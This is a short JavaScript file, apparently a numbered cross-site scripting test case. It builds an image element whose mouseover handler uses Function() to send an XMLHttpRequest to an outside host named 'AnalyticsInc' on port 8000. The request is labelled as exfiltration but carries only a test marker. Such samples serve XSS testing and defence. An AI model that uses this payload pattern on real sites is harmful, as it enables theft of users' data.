function exfiltrate_key_history() {

    // XSS 8 - IMG Default Empty SRC with Event - No Obfuscation
    // Exfiltrate data using XMLHTTP request
    var script = document.createElement("img");
    script.src = '';
    script.onmouseover = Function('xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss8",true);xmlhttp.send(null);');
	script.height = '50';
	script.width = '50';
	script.alt = 'image';
	document.getElementsByTagName('body')[0].appendChild(script);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;